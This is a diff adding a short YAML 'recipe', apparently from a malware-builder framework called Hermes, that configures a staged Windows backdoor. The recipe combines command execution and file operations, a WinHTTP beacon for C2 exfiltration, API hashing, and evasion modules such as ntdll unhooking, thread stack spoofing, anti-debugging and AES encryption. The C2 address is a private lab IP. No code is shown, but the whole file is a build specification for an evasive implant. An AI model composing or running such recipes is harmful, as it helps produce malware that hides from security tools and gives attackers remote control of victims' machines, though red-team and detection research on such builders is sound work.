@@ -1,0 +1,20 @@
+name: backdoor_cs_epoch5_winhttp_v3
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors: []
+exfil: c2/winhttp_beacon
+arch: arch/backdoor_staged
+resources: true
+api_resolve: api_resolve/api_hash_fnv1a
+evasion:
+- evasion/unhook_ntdll
+- evasion/sleep_jitter
+- evasion/thread_stack_spoof
+- evasion/anti_debug_heap
+- evasion/aes_encrypt
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
